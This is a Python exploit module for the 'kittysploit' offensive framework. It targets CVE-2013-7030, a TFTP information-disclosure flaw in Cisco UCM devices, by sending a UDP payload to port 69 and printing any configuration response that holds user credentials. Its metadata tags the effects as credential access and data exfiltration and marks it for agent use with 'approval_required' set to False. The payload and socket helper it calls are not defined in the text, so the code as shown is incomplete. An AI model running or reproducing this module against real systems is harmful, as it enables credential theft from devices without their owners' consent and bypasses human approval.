#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco UCM Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Cisco UCM Info Disclosure',
        'description': 'Module exploits information disclosure vulnerability in Cisco UCM devices. If the target is vulnerable it is possible to read sensitive information through TFTP service.',
        'author': ['Daniel Svartman <danielsvartman@gmail.com', 'Marcin Bury'],
        'cve': ['CVE-2013-7030'],
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/30237/', 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7030'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'cve-2013-7030', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(69, "Target port")

    def run(self):
        print_status("Sending payload")
        udp_client = _udp_socket(self)
        udp_client.send(self.payload)

        response = udp_client.recv(2048)

        if response and len(response):
            if b"UseUserCredential" in response:
                print_success("Exploit success - file {}".format("SPDefault.cnf.xml"))
                print_info(response)
            else:
                print_error("Exploit failed - credentials not found in response")
        else:
            print_error("Exploit failed - empty response")
    def check(self):
        udp_client = _udp_socket(self)
        udp_client.send(self.payload)

        response = udp_client.recv(2048)

        if response and len(response) and b"UseUserCredential" in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
